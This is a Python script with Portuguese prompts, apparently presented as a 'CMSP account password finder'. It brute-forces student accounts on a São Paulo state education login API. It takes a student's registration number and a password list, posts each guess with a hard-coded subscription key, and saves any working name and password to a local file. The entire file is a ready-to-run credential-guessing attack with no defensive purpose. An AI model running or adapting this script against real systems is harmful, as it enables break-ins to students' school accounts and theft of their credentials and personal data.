import requests
import time
import os

def atualizar_sucesso(usuario, senha, nome):
arquivo = "sucesso.txt"
linhas_atualizadas = []
usuario_encontrado = False
nova_linha = f"User: {usuario} | Nome: {nome} | Senha: {senha}\n"

# Se o arquivo já existe, lê as linhas para verificar duplicatas  
if os.path.exists(arquivo):  
    with open(arquivo, "r", encoding="utf-8") as f:  
        for linha in f:  
            # Verifica se a linha começa com o usuário específico  
            if linha.startswith(f"User: {usuario} |"):  
                linhas_atualizadas.append(nova_linha)  
                usuario_encontrado = True  
            else:  
                linhas_atualizadas.append(linha)  

# Se o usuário não estava no arquivo, adiciona a nova linha ao final  
if not usuario_encontrado:  
    linhas_atualizadas.append(nova_linha)  

# Sobrescreve o arquivo com a lista atualizada  
with open(arquivo, "w", encoding="utf-8") as f:  
    f.writelines(linhas_atualizadas)

def realizar_teste():
os.system("clear")

print("="*30)  
print(r"""

_   _
| \ | |_   _ _ __   ___  _____  ___   _ ____
|  | | | | | '_ \ / _ / \ / / | | |  /
| |\  | || | | | |  _/_ >  <| || |/ /
|| _|_,|| |_|_||//_\, /|
|_/
""")
print(" Feito por @Nunesxyz - CMSP ACCOUNT PASSWORD FINDER ")
print("="*30)

ra = input("Digite o RA (apenas números): ").strip()  
digito = input("Digite o Dígito do RA: ").strip()  
uf = "SP"   
caminho_txt = input("Nome do arquivo de senhas: ").strip()  

usuario_completo = f"{ra}{digito}{uf}"  
url = "https://sedintegracoes.educacao.sp.gov.br/saladofuturobffapi/credenciais/api/LoginCompletoToken"  
  
headers = {  
    "Accept": "application/json, text/plain, */*",  
    "Content-Type": "application/json",  
    "Ocp-Apim-Subscription-Key": "d701a2043aa24d7ebb37e9adf60d043b",  
    "User-Agent": "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0"  
}  

try:  
    with open(caminho_txt, "r") as f:  
        senhas = [linha.strip() for linha in f.readlines() if linha.strip()]  
except FileNotFoundError:  
    print(f"\n[!] Erro: Arquivo '{caminho_txt}' não encontrado.")  
    return  

print(f"\n[*] Iniciando testes para: {usuario_completo}\n")  

for senha in senhas:  
    payload = {"user": usuario_completo, "senha": senha}  

    try:  
        response = requests.post(url, json=payload, headers=headers)  
          
        if response.status_code == 200:  
            dados = response.json()  
            if "token" in dados:  
                nome_usuario = dados.get('DadosUsuario', {}).get('NAME', 'Nao Encontrado')  
                  
                print(f"\n[+] SUCESSO!")  
                print(f"[+] Nome: {nome_usuario}")  
                print(f"[+] Senha: {senha}")  
                  
                # Chama a função para salvar ou substituir  
                atualizar_sucesso(usuario_completo, senha, nome_usuario)  
                return   
              
        elif response.status_code in [400, 401]:  
            print(f"[-] Falhou: {senha}")  
        else:  
            print(f"[!] Status {response.status_code} para a senha {senha}")  

    except Exception as e:  
        print(f"[!] Erro na conexão: {e}")  
      
    time.sleep(0.1) # Pequeno delay para estabilidade  

print("\n[!] Fim da lista. Nenhuma senha funcionou.")

if name == "main":
realizar_teste()
